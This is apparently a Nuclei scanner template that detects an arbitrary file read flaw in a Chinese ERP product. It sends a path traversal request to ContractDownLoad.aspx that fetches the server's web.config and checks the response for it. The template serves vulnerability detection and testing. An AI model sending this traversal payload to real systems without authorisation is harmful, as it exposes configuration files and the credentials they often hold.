id: tianwen-wuye-erp-contractdownload-aspx-file-read
info:
  name: "天威伟业 ERP ContractDownLoad.aspx 任意文件读取漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: 天威伟业ERP
http:
  - method: GET
    path:
      - "{{BaseURL}}/HM/M_Main/InformationManage/ContractDownLoad.aspx?ContractFile=../web.config"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "filename=web.config"
      - type: word
        part: header
        words:
          - "application/octet-stream"
      - type: word
        part: body
        words:
          - "<configuration>"
